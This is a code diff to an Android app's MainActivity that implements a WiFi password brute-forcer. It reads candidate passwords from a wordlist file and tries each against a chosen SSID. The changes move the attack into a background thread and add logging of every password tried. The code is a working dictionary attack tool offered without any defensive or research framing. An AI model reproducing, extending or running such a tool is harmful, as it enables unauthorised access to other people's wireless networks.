@@ -32,7 +32,35 @@ public class MainActivity extends AppCompatActivity {
         wifi.setWifiEnabled(false);
     }
 
+    //////////////BRUTE//////////////////
+    class Bruter implements Runnable{
+        @Override
+        public void run() {
+            try {
+                doBrute();
+            } catch (InterruptedException e) {}
+        }
+    };
     public void bruteWiFi(View view) throws InterruptedException {
+        //doBrute();
+        Bruter task = new Bruter();
+        Thread thread = new Thread(task);
+        thread.start();
+        //Runnable task = (Runnable) doBrute(wifi);
+        /*
+        int pass_len = 8;
+        String pass = "        ";//8 spaces
+        char passChars[] = pass.toCharArray();
+        for(int i = 0;i<pass_len;i++){
+            while(passChars[i] <= 126){
+                if(passChars[i] == 126){
+                }
+                i++;
+            }
+        }*/
+    }
+
+    public void doBrute() throws InterruptedException {
         WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
         wifi.setWifiEnabled(true);
 
@@ -58,7 +86,7 @@ public class MainActivity extends AppCompatActivity {
             String line;
             String data = "";
             BufferedReader br = new BufferedReader(new FileReader(pathToFile));
-            if(spliter.equals("") || spliter == null || spliter.equals("null")) {//if spliter null - work
+            if(spliter.equals("") || spliter == null) {//if spliter null - work
                 errorView.append("Spliter is emply!\r\nSpliting by new string\r\n");
                 while ((line = br.readLine()) != null) {
                     res = connectToUnknown(wifi, ssid, line.trim(), true);
@@ -93,19 +121,8 @@ public class MainActivity extends AppCompatActivity {
                 }
             }
         }
-        /*
-        int pass_len = 8;
-        String pass = "        ";//8 spaces
-        char passChars[] = pass.toCharArray();
-        for(int i = 0;i<pass_len;i++){
-            while(passChars[i] <= 126){
-                if(passChars[i] == 126){
-                }
-                i++;
-            }
-        }*/
     }
-
+/////////////////////////////////////////////////////////////////////
     public void connect(View view) throws InterruptedException {
         WifiManager wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
         wifi.setWifiEnabled(true);
@@ -217,6 +234,7 @@ public class MainActivity extends AppCompatActivity {
         wifiConf.SSID = ("\"" + ssid + "\"");
         if(!pass.equals(""))
             wifiConf.preSharedKey = ("\"" + pass + "\"");
+        errorView.append("Trying pass: " + ("\"" + pass + "\"\r\n"));
         int res = wifi.addNetwork(wifiConf);
         if (!silent)
             errorView.append("add Network returned " + res + "\r\n");
